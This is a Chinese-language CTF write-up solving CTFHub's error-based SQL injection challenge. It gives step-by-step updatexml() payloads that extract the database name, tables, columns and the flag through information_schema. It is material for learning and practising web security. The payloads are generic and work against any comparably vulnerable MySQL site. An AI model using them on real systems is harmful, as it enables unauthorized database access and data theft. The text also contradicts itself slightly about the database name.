---
title: CTFHub 报错注入
date: 2026-09-28
categories: CTFHub Web
tags: CTFHub Web SQL注入 报错注入
---
# 题目：CTFHub 报错注入

## 题目描述
CTFHub‑SQL报错注入，数字型注入点，页面没有回显位，利用MySQL的 updatexml() 函数进行报错注入，通过XPATH语法错误把查询结果输出到报错信息中。
 
## 解题思路
 页面接收 id 参数，直接拼接进SQL语句，没有输出查询结果，但会打印SQL执行错误。利用 updatexml 报错函数，将想要查询的数据拼入报错信息，依次爆出数据库名、表名、字段名，最后获取flag。
 
## 解题步骤
1. 判断注入点，测试报错Payload
页面执行SQL： select * from news where id=1 ，属于数字型注入。
   
Payload获取数据库名：
?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
0x7e 是 ~ 符号，用来分隔，触发报错把数据库名爆出来。
 
-解释payload
   -  updatexml(1, 报错内容,1) ：MySQL报错函数
   -  concat(0x7e,database(),0x7e) ：把数据库名拼上 ~ ，放到报错信息输出
 拿到数据库名，一般是 ctfhub 。

报错输出 ~sqli~ ，得到数据库名： sqli 
 
2. 爆出数据库中的表名
?id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x7e),1)

修改 limit 0,1  →  limit 1,1 依次遍历所有表。

报错得到表名： flag 
 
3. 爆出flag表的字段名
?id=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='flag' limit 0,1),0x7e),1)
得到字段名： flag 
 
4. 查询flag数据
?id=1 and updatexml(1,concat(0x7e,(select flag from flag limit 0,1),0x7e),1)
updatexml最多输出32字符，使用 substr() 截取后半部分补全完整flag：ctfhub{1e4d0d47b856b0bd0ec9992e}

## 踩坑指南
1. 本题是数字型注入，payload不需要加单引号。
2. updatexml 函数限制输出长度最多32字节，长flag会被截断，需要用 substr() 分段获取前后两段再拼接。
3. 0x7e 是十六进制的 ~ 波浪符号，用于分割报错内容，方便识别查询返回的数据。
4. 报错提示 XPATH syntax error ，代表报错注入执行成功， ~xxx~ 中间就是查询结果。

## 知识点总结
1. updatexml报错注入原理： updatexml(目标xml文档, XPATH表达式, 替换内容) ，XPATH表达式语法错误时，会直接把表达式内的内容输出到报错。
2. information_schema 是MySQL系统库，存放数据库、表、字段元数据。
3. substr(str,pos) ：字符串截取函数，用来解决updatexml输出长度限制。
